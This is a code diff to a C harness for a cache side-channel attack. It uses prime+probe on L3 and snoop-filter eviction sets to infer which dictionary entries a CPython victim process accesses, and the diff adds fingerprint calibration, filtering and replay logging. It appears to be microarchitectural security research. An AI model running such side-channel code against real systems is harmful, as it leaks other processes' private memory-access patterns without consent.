@@ -3,73 +3,68 @@
 
 #include "arch.h"
 #include "config.h"
+#include "cpython_runtime.h"
+#include "fs.h"
 #include "log.h"
 #include "prime_probe.h"
 #include "shared_memory.h"
-#include "math.h"
+
+#include <math.h>
+#include <time.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <threads.h>
-#include <unistd.h>
 
-static const char *dump_dir = "cpython_dict_profiling";
-static const uint64_t max_exec_cycles = (uint64_t)2e6;
 enum { cache_line_count = 1, profile_iterations = 1 << 16 };
 static uint64_t probe_time_arr[cache_line_count][profile_iterations];
 static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
 static uint64_t *sample_tsc[cache_line_count];
 static uint64_t *probe_time[cache_line_count];
-static uint64_t *reload_time[cache_line_count];
 static const int dict_entries = 1 << 16;
-static const int target_entries = 128;
-static const int dict_iterations = 16;
 static const float factor = 0.75;
 
+static const int target_entries = 4;
+static const int dict_iterations = 32;
 static const int attack_iterations = 100;
+static const int window_margin_pct = 120;
+static const int cali_num = 10;
+static const int refine_rounds = 10;
+static const int refine_min = 6;
+static const int min_fingerprint_sets = 10;
+static const double max_cross_similarity = 0.35;
+
+static int discriminative_cap;
+static uint64_t max_exec_cycles;
 
 u32 *profiles = NULL;
 f64 *expected_hits = NULL;
 static config_t *cfg;
 static int *targets, *select_all_mask, *select_all, select_all_num = 0;
-static bool use_cos = true;
+
+static char replay_dir[512];
+static FILE *replay_attack_fp = NULL;
+
+static double cos_self_min = 1.0, cos_cross_max = 0.0;
 
 static bool check(u32 ctr) {
 	return (ctr >= dict_iterations * factor) &&
 	       (ctr <= dict_iterations / factor);
 }
 
-static int qsort_lt(const void *a, const void *b) {
-	int64_t va = (*(int64_t *)a);
-	int64_t vb = (*(int64_t *)b);
-	if (va == vb) {
-		return 0;
-	} else {
-		return va < vb ? -1 : 1;
-	}
+static int qsort_int_lt(const void *a, const void *b) {
+	int va = *(const int *)a;
+	int vb = *(const int *)b;
+	return (va > vb) - (va < vb);
 }
 
-void check_distribution(uint64_t *probes, int length) {
-	if (length == 0) {
-		return;
-	}
-	uint64_t ts_diff[profile_iterations];
-	double mean = 0;
-	memset(ts_diff, 0, sizeof(ts_diff));
-	for (int i = 1; i < length; ++i) {
-		ts_diff[i - 1] = probes[i] - probes[i - 1];
-		mean += ts_diff[i - 1];
-	}
-	qsort(ts_diff, length - 1, sizeof(uint64_t), qsort_lt);
-	int mid = (length - 1) * 1.0 / 2;
-	mean /= length;
-	/* log_info("median: %ld mean: %lf", ts_diff[mid], mean); */
-	return;
+static void release_victim(void) {
+	pthread_barrier_wait(sync_ctx.barrier);
+	sync_ctx_set_action(SYNC_CTX_EXIT);
+	pthread_barrier_wait(sync_ctx.barrier);
 }
 
-static u32
-cpython_PS_profile_once(EVSet *evset, int slot, uint64_t max_exec_cycles) {
+static u32 cpython_PS_profile_once(EVSet *evset, uint64_t max_exec_cycles) {
 	uint64_t tsc0, tsc1;
 	uint8_t *scope = evset->addrs[0];
 	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
@@ -106,33 +101,19 @@ cpython_PS_profile_once(EVSet *evset, int slot, uint64_t max_exec_cycles) {
 }
 
 static void profile(uint64_t i, int j) {
-	*(uint64_t *)(sync_ctx.data) = (uint64_t)i;
+	*(uint64_t *)sync_ctx.data = i;
 	for (int l3_set = 0; l3_set < cfg->l3.sets; ++l3_set) {
 		if (l3_set % 1000 == 0) {
 			log_info("profile set %d: L3 set: %d", j, l3_set);
 		}
 		EVSet *evset = get_sf_kth_evset(l3_set);
 		if (evset) {
-			memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
-			memset(probe_time_arr, 0, sizeof(probe_time_arr));
-
+			*(uint64_t *)sync_ctx.data = i;
 			sync_ctx_set_action(SYNC_CTX_PROBE);
 
 			pthread_barrier_wait(sync_ctx.barrier);
 
-			u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);
-
-			if (check(res)) {
-				check_distribution(sample_tsc_arr[0], res);
-			}
-
-			dump_profiling_traces("dictionary",
-			                      32,
-			                      sample_tsc,
-			                      probe_time,
-			                      cache_line_count,
-			                      profile_iterations,
-			                      0);
+			u32 res = cpython_PS_profile_once(evset, max_exec_cycles);
 
 			pthread_barrier_wait(sync_ctx.barrier);
 
@@ -147,20 +128,17 @@ static void profile(uint64_t i, int j) {
 	}
 }
 
-static void profile_selected(int i, int j, int *sel, int sel_num) {
+static void profile_selected(uint64_t i, int j, int *sel, int sel_num) {
 	for (int idx = 0; idx < sel_num; ++idx) {
 		int l3_set = sel[idx];
 		EVSet *evset = get_sf_kth_evset(l3_set);
 		if (evset) {
-			memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
-			memset(probe_time_arr, 0, sizeof(probe_time_arr));
-
+			*(uint64_t *)sync_ctx.data = i;
 			sync_ctx_set_action(SYNC_CTX_PROBE);
-			*sync_ctx.data = i;
 
 			pthread_barrier_wait(sync_ctx.barrier);
 
-			u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);
+			u32 res = cpython_PS_profile_once(evset, max_exec_cycles);
 
 			pthread_barrier_wait(sync_ctx.barrier);
 
@@ -198,64 +176,10 @@ selected_cos_similarity(int test_id, int exam_id, int *sel, int sel_num) {
 	return dot / denom;
 }
 
-static int infer_unique(int j) {
-	u32 unique[target_entries];
-	u32 matching[target_entries];
-	memset(unique, 0, target_entries * sizeof(u32));
-	memset(matching, 0, target_entries * sizeof(u32));
-
-	for (int l3 = 0; l3 < cfg->l3.sets; ++l3) {
-		u32 ctr = profiles[j * cfg->l3.sets + l3];
-		bool c = check(ctr);
-
-		for (int i = 0; i < target_entries; ++i) {
-			u32 tctr = profiles[i * cfg->l3.sets + l3];
-			bool t = check(tctr);
-
-			if (c != t) {
-				unique[i]++;
-			}
-
-			if (c && t) {
-				matching[i]++;
-			}
-		}
-	}
-
-	int index = -1;
-	double unique_sum = 0;
-
-	for (int i = 0; i < target_entries; ++i) {
-		log_info("%d: unique[%d] = %u", j, i, unique[i]);
-		log_info("%d: matching[%d] = %u", j, i, matching[i]);
-		unique_sum += unique[i];
-		if (index != -1) {
-			if (unique[i] < unique[index]) {
-				index = i;
-			}
-		} else {
-			index = i;
-		}
-	}
-
-	double threshold = (unique_sum / target_entries) * 0.75;
-
-	log_info("Threshold: %lf", threshold);
-
-	if (unique[index] <= threshold) {
-		return index;
-	}
-
-	return -1;
-}
-
 static double cos_target_thres = 1;
 
 static inline int calibrate_cos_sim() {
-	double cos_self_thres = 1, cos_others_thres = 0;
-
 	for (int i = 0; i < target_entries; ++i) {
-		int cali_num = 10;
 		int **temp_hits = calloc(select_all_num, sizeof(int *));
 		for (int j = 0; j < select_all_num; ++j)
 			temp_hits[j] = calloc(cali_num, sizeof(int));
@@ -264,40 +188,60 @@ static inline int calibrate_cos_sim() {
 			for (int j = 0; j < select_all_num; ++j) {
 				int slot = i * cfg->l3.sets + select_all[j];
 				temp_hits[j][k] = profiles[slot];
-				/* expected_hits[slot] += profiles[slot] / 10.; */
 			}
 		}
 		for (int j = 0; j < select_all_num; ++j) {
 			int slot = i * cfg->l3.sets + select_all[j];
-			qsort(temp_hits[j], cali_num, sizeof(int), qsort_lt);
+			qsort(temp_hits[j], cali_num, sizeof(int), qsort_int_lt);
 			expected_hits[slot] = (temp_hits[j][cali_num >> 1] +
 			                       temp_hits[j][(cali_num - 1) >> 1]) /
 			                      2.;
 		}
+		for (int j = 0; j < select_all_num; ++j)
+			free(temp_hits[j]);
+		free(temp_hits);
 	}
 
+	cos_self_min = 1.0;
+	cos_cross_max = 0.0;
 	for (int i = 0; i < target_entries; ++i) {
 		double sim;
-		for (int j = i; j < target_entries; ++j) {
+		for (int j = 0; j < target_entries; ++j) {
 			sim = selected_cos_similarity(i, j, select_all, select_all_num);
 			if (i == j) {
-				cos_self_thres = __min(cos_self_thres, sim);
+				cos_self_min = __min(cos_self_min, sim);
 			} else {
-				cos_others_thres = __max(cos_others_thres, sim);
+				cos_cross_max = __max(cos_cross_max, sim);
 			}
-			cos_target_thres = __min(cos_target_thres, sim);
 			log_info("Cos_sim(%d, %d)=%lf", i, j, sim);
 		}
 	}
-	log_info("cos self thres %lf, cos other thres %lf -> %lf",
-	         cos_self_thres,
-	         cos_others_thres,
-	         (cos_self_thres * 3 + cos_others_thres * 1) / 4);
-	/* cos_target_thres = (cos_self_thres * 3 + cos_others_thres * 1) / 4; */
-	cos_target_thres = .9;
-	/* if (cos_self_thres < cos_others_thres) { */
-	/* 	return 1; */
-	/* } */
+
+	double auto_thres = (cos_self_min * 3 + cos_cross_max * 1) / 4;
+	log_info("cos self min %lf, cos cross max %lf -> auto %lf",
+	         cos_self_min,
+	         cos_cross_max,
+	         auto_thres);
+
+	cos_target_thres = auto_thres;
+	if (cos_target_thres < 0.5)
+		cos_target_thres = 0.5;
+	if (cos_target_thres > 0.999)
+		cos_target_thres = 0.999;
+	log_info("cos target threshold = %lf", cos_target_thres);
+
+	if (cos_self_min <= cos_cross_max) {
+		log_error("FINGERPRINTS DO NOT SEPARATE: self min %lf <= cross max %lf",
+		          cos_self_min,
+		          cos_cross_max);
+		return 1;
+	}
+	if (cos_cross_max > max_cross_similarity) {
+		log_error("FINGERPRINTS TOO ALIKE: cross max %lf > %lf",
+		          cos_cross_max,
+		          max_cross_similarity);
+		return 1;
+	}
 	return 0;
 }
 
@@ -320,39 +264,131 @@ static int infer_cos(int test_id) {
 	return -1;
 }
 
-static int infer(int j) {
-	if (use_cos) {
-		return infer_cos(j);
-	} else {
-		return infer_unique(j);
+static void replay_open(void) {
+	time_t now = time(NULL);
+	struct tm tm_now;
+	char stamp[32];
+	localtime_r(&now, &tm_now);
+	strftime(stamp, sizeof(stamp), "%Y%m%d_%H%M%S", &tm_now);
+	snprintf(replay_dir, sizeof(replay_dir), "output/cpython_dict_%s", stamp);
+	create_directory(replay_dir);
+
+	char path[600];
+	snprintf(path, sizeof(path), "%s/meta.txt", replay_dir);
+	FILE *fp = fopen(path, "w");
+	if (fp) {
+		fprintf(fp, "target_entries\t%d\n", target_entries);
+		fprintf(fp, "dict_iterations\t%d\n", dict_iterations);
+		fprintf(fp, "dict_entries\t%d\n", dict_entries);
+		fprintf(fp, "attack_iterations\t%d\n", attack_iterations);
+		fprintf(fp, "max_exec_cycles\t%lu\n", max_exec_cycles);
+		fprintf(fp, "band_low\t%d\n", (int)(dict_iterations * factor));
+		fprintf(fp, "band_high\t%d\n", (int)(dict_iterations / factor));
+		fprintf(fp, "l3_sets\t%lu\n", (unsigned long)cfg->l3.sets);
+		fprintf(fp, "cali_num\t%d\n", cali_num);
+		fprintf(fp, "refine_rounds\t%d\n", refine_rounds);
+		fprintf(fp, "refine_min\t%d\n", refine_min);
+		fprintf(fp, "discriminative_cap\t%d\n", discriminative_cap);
+		fclose(fp);
 	}
 }
 
-static bool check_eviction(EVSet *evset, void *target) {
-	uint64_t acc_time0, acc_time1;
-	uint8_t *scope = evset->addrs[0];
-	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
+static void replay_dump_fingerprints(void) {
+	char path[600];
 
-	mem_read(target);
-	acc_time0 = timed_access(target);
+	snprintf(path, sizeof(path), "%s/select_sets.txt", replay_dir);
+	FILE *fp = fopen(path, "w");
+	if (fp) {
+		for (int j = 0; j < select_all_num; ++j) {
+			fprintf(fp, "%d\n", select_all[j]);
+		}
+		fclose(fp);
+	}
 
-	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
+	snprintf(path, sizeof(path), "%s/targets.txt", replay_dir);
+	fp = fopen(path, "w");
+	if (fp) {
+		for (int i = 0; i < target_entries; ++i) {
+			fprintf(fp, "%d\t%d\n", i, targets[i]);
+		}
+		fclose(fp);
+	}
 
-	acc_time1 = timed_access(target);
+	snprintf(path, sizeof(path), "%s/fingerprints.txt", replay_dir);
+	fp = fopen(path, "w");
+	if (fp) {
+		for (int i = 0; i < target_entries; ++i) {
+			fprintf(fp, "%d", i);
+			for (int j = 0; j < select_all_num; ++j) {
+				fprintf(fp,
+				        "\t%.3f",
+				        expected_hits[i * cfg->l3.sets + select_all[j]]);
+			}
+			fprintf(fp, "\n");
+		}
+		fclose(fp);
+	}
 
-	/* log_info("access time before %lu after %lu", acc_time0, acc_time1); */
-	if (acc_time1 > 90) {
-		log_info("evict time %lu %lu", acc_time0, acc_time1);
-		return true;
-	} else {
-		return false;
+	snprintf(path, sizeof(path), "%s/calibration.txt", replay_dir);
+	fp = fopen(path, "w");
+	if (fp) {
+		fprintf(fp, "cos_self_min\t%.6f\n", cos_self_min);
+		fprintf(fp, "cos_cross_max\t%.6f\n", cos_cross_max);
+		fprintf(fp, "cos_target_thres\t%.6f\n", cos_target_thres);
+		fprintf(fp, "select_all_num\t%d\n", select_all_num);
+		fclose(fp);
+	}
+
+	snprintf(path, sizeof(path), "%s/attack.txt", replay_dir);
+	replay_attack_fp = fopen(path, "w");
+	if (replay_attack_fp) {
+		fprintf(replay_attack_fp,
+		        "iter\tkind\tdict_index\tgt_target\tvector\n");
+		fflush(replay_attack_fp);
 	}
 }
 
-int main(int argc, char *argv[]) {
+static void replay_dump_attack(int iter,
+                               const char *kind,
+                               int dict_index,
+                               int gt_target,
+                               int slot) {
+	if (!replay_attack_fp) {
+		return;
+	}
+	fprintf(
+	    replay_attack_fp, "%d\t%s\t%d\t%d", iter, kind, dict_index, gt_target);
+	for (int j = 0; j < select_all_num; ++j) {
+		fprintf(replay_attack_fp,
+		        "\t%u",
+		        profiles[slot * cfg->l3.sets + select_all[j]]);
+	}
+	fprintf(replay_attack_fp, "\n");
+	fflush(replay_attack_fp);
+}
+
+int main(void) {
 	srand(time(NULL));
 
 	cfg = get_config();
+
+	discriminative_cap = (int)round(sqrt((double)target_entries));
+	max_exec_cycles = (uint64_t)dict_iterations * CPYTHON_EXTRA_WAITING_TIME *
+	                  window_margin_pct / 100;
+
+	log_info("config: targets=%d iters=%d band=[%d,%d] window=%lu attack=%d "
+	         "cap=%d refine=%d/%d cali=%d",
+	         target_entries,
+	         dict_iterations,
+	         (int)(dict_iterations * factor),
+	         (int)(dict_iterations / factor),
+	         max_exec_cycles,
+	         attack_iterations,
+	         discriminative_cap,
+	         refine_min,
+	         refine_rounds,
+	         cali_num);
+	log_warn("cpython_rt MUST be launched with iterations=%d", dict_iterations);
 
 	if (cache_env_init(1)) {
 		log_error("Failed to initialize cache env!");
@@ -362,7 +398,6 @@ int main(int argc, char *argv[]) {
 	for (int i = 0; i < cache_line_count; ++i) {
 		sample_tsc[i] = sample_tsc_arr[i];
 		probe_time[i] = probe_time_arr[i];
-		reload_time[i] = probe_time_arr[i];
 	}
 
 	init_sync_ctx(CPYTHON_PROJ_ID);
@@ -375,7 +410,8 @@ int main(int argc, char *argv[]) {
 
 	if (LLCF_multi_evset(0, &hctrl)) {
 		log_error("Failed to build evset");
-		return 0;
+		release_victim();
+		return 4;
 	}
 
 	log_info("l2 thres %d, interrupt thres %d",
@@ -384,14 +420,19 @@ int main(int argc, char *argv[]) {
 
 	if (start_helper_thread(&hctrl)) {
 		log_error("Failed to start helper!");
-		return 0;
+		release_victim();
+		return 4;
 	}
+
+	pthread_barrier_wait(sync_ctx.barrier);
 
 	u32 l3_sets = cfg->l3.sets;
 	u32 profile_size = l3_sets * (target_entries + 2);
 	profiles = malloc(profile_size * sizeof(u32));
 	memset(profiles, 0, profile_size * sizeof(u32));
 	expected_hits = calloc(profile_size, sizeof(f64));
+
+	replay_open();
 
 	targets = calloc(target_entries, sizeof(int));
 	for (int i = 0; i < target_entries; ++i) {
@@ -408,13 +449,11 @@ int main(int argc, char *argv[]) {
 			}
 		} while (found);
 		targets[i] = target;
+		log_info("target %d = dict index %d", i, target);
 	}
 
-	if (use_cos) {
-		select_all_mask = calloc(cfg->l3.sets, sizeof(int));
-		select_all = calloc(cfg->l3.sets, sizeof(int));
-		select_all_num = 0;
-	}
+	select_all_mask = calloc(cfg->l3.sets, sizeof(int));
+	select_all = calloc(cfg->l3.sets, sizeof(int));
 
 	int *match_cnt = calloc(cfg->l3.sets, sizeof(int));
 	int *cand = calloc(cfg->l3.sets, sizeof(int));
@@ -444,50 +483,93 @@ int main(int argc, char *argv[]) {
 			cand[cand_num++] = i;
 		}
 	}
+	log_info("candidate sets in band: %d", cand_num);
+
+	if (cand_num == 0) {
+		log_error("No candidate cache set fell in band [%d,%d]; evsets or "
+		          "victim iteration count are wrong",
+		          (int)(dict_iterations * factor),
+		          (int)(dict_iterations / factor));
+		sync_ctx_set_action(SYNC_CTX_EXIT);
+		pthread_barrier_wait(sync_ctx.barrier);
+		return 3;
+	}
 
 	// Filter
+	if (refine_rounds == 0) {
+		for (int c = 0; c < cand_num; ++c) {
+			for (int i = 0; i < target_entries; ++i) {
+				if (check(profiles[i * cfg->l3.sets + cand[c]])) {
+					correlation[c] += 1;
+				}
+			}
+		}
+	}
 	for (int i = 0; i < target_entries; ++i) {
-		if (use_cos) {
-			int validation_cnt = 10, validation_thres = 9;
+		if (refine_rounds > 0) {
 			memset(match_cnt, 0, cfg->l3.sets * sizeof(int));
-			for (int k = 0; k < validation_cnt; k++) {
+			for (int k = 0; k < refine_rounds; k++) {
 				profile_selected(targets[i], target_entries, cand, cand_num);
 				for (int j = 0; j < cand_num; ++j) {
 					u32 cnt = profiles[target_entries * cfg->l3.sets + cand[j]];
 					match_cnt[j] += check(cnt);
 				}
 			}
+			int activated = 0;
 			for (int j = 0; j < cand_num; ++j) {
-				if (match_cnt[j] >= validation_thres) {
+				if (match_cnt[j] >= refine_min) {
 					correlation[j] += 1;
+					activated++;
 				}
 			}
+			log_info("target %d activates %d/%d candidate sets",
+			         i,
+			         activated,
+			         cand_num);
 		}
 	}
 
 	for (int i = 0; i < cand_num; ++i) {
-		if (correlation[i] > 0 &&
-		    correlation[i] <= round(sqrt(target_entries))) {
+		if (correlation[i] > 0 && correlation[i] <= discriminative_cap) {
 			select_all_mask[cand[i]] = 1;
-			log_info("chose %d %d", i, cand[i]);
+			log_info(
+			    "chose %d %d (correlation %d)", i, cand[i], correlation[i]);
 		}
 	}
 
-	if (use_cos) {
-		for (int i = 0; i < cfg->l3.sets; ++i) {
-			if (select_all_mask[i]) {
-				select_all[select_all_num++] = i;
-			}
-		}
-		free(select_all_mask);
-
-		if (calibrate_cos_sim()) {
-			log_error("Failed to calibrate cosine similarity");
-			sync_ctx_set_action(SYNC_CTX_EXIT);
-			pthread_barrier_wait(sync_ctx.barrier);
-			return 1;
+	for (int i = 0; i < cfg->l3.sets; ++i) {
+		if (select_all_mask[i]) {
+			select_all[select_all_num++] = i;
 		}
 	}
+	free(select_all_mask);
+	select_all_mask = NULL;
+
+	log_info("fingerprint sets selected: %d / %d candidates",
+	         select_all_num,
+	         cand_num);
+
+	if (select_all_num < min_fingerprint_sets) {
+		log_error("Only %d fingerprint sets survived the filter, need %d "
+		          "(cap=%d, refine %d/%d); rebuild evsets and retry",
+		          select_all_num,
+		          min_fingerprint_sets,
+		          discriminative_cap,
+		          refine_min,
+		          refine_rounds);
+		sync_ctx_set_action(SYNC_CTX_EXIT);
+		pthread_barrier_wait(sync_ctx.barrier);
+		return 3;
+	}
+
+	if (calibrate_cos_sim()) {
+		log_error("Failed to calibrate cosine similarity");
+		replay_dump_fingerprints();
+		sync_ctx_set_action(SYNC_CTX_EXIT);
+		pthread_barrier_wait(sync_ctx.barrier);
+		return 2;
+	}
+	replay_dump_fingerprints();
 
 	int target_success = 0;
 	int target_access = 0;
@@ -498,12 +580,9 @@ int main(int argc, char *argv[]) {
 
 		// Hit
 		int h = rand() % target_entries;
-		if (use_cos) {
-			profile_selected(
-			    targets[h], target_entries, select_all, select_all_num);
-		} else {
-			profile(targets[h], target_entries);
-		}
+		profile_selected(
+		    targets[h], target_entries, select_all, select_all_num);
+		replay_dump_attack(i, "target", targets[h], h, target_entries);
 
 		// Miss
 		int nh = 0;
@@ -518,15 +597,11 @@ int main(int argc, char *argv[]) {
 				}
 			}
 		} while (found);
-		if (use_cos) {
-			profile_selected(
-			    nh, target_entries + 1, select_all, select_all_num);
-		} else {
-			profile(nh, target_entries + 1);
-		}
+		profile_selected(nh, target_entries + 1, select_all, select_all_num);
+		replay_dump_attack(i, "nontarget", nh, -1, target_entries + 1);
 
 		log_info("Hit at target index %d (%d)", targets[h], h);
-		int hi = infer(target_entries);
+		int hi = infer_cos(target_entries);
 		if (hi != -1) {
 			target_access++;
 		}
@@ -538,7 +613,7 @@ int main(int argc, char *argv[]) {
 		}
 
 		log_info("Hit at non-target index %d", nh);
-		int ni = infer(target_entries + 1);
+		int ni = infer_cos(target_entries + 1);
 		if (ni == -1) {
 			access_success++;
 			log_info("Correctly identfied access");
@@ -553,10 +628,22 @@ int main(int argc, char *argv[]) {
 	         (float)target_access / attack_iterations);
 	log_info("Access success rate: %f",
 	         (float)access_success / attack_iterations);
+	log_info("Replay data written to %s", replay_dir);
+
+	if (replay_attack_fp) {
+		fclose(replay_attack_fp);
+	}
 
 	sync_ctx_set_action(SYNC_CTX_EXIT);
 	pthread_barrier_wait(sync_ctx.barrier);
 
+	free(match_cnt);
+	free(cand);
+	free(cand_mask);
+	free(correlation);
+	free(select_all);
+	free(targets);
+	free(expected_hits);
 	free(profiles);
 
 	return 0;
